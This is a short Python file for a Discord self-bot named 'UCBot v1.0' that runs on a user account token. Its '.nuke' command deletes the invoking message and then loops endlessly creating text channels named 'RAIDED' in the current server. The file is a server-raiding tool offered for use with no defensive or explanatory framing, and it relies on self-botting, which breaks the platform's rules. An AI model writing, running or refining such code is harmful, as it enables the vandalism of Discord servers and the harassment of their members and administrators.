import discord
from discord.ext import commands
from discord.ext.commands import bot
import time

print('UCBot v1.0')
bot = commands.Bot(command_prefix='.', self_bot=True)

@bot.command()
async def nuke(ctx):
  await ctx.message.delete()
  await ctx.channel.send('ok')
  while True:
    channel = await ctx.guild.create_text_channel('RAIDED')

bot.run("paste discord token into speech marks", bot = False)
